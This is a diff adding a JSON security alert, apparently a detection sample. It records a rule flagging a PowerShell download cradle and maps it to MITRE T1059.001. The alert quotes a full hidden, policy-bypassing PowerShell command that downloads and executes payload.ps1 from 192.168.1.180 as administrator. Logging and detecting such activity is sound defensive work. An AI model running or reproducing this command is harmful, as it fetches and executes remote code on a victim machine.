@@ -1,0 +1,25 @@
+{
+  "timestamp": "2026-06-29T21:00:15.123Z",
+  "rule": {
+    "id": "100201",
+    "level": 12,
+    "description": "Possible PowerShell download cradle detected",
+    "mitre": {
+      "id": ["T1059.001"],
+      "tactic": ["Execution"]
+    }
+  },
+  "agent": {
+    "id": "002",
+    "name": "workstation-windows-11"
+  },
+  "data": {
+    "win": {
+      "eventdata": {
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.180/payload.ps1')\"",
+        "subjectUserName": "administrator"
+      }
+    }
+  }
+}
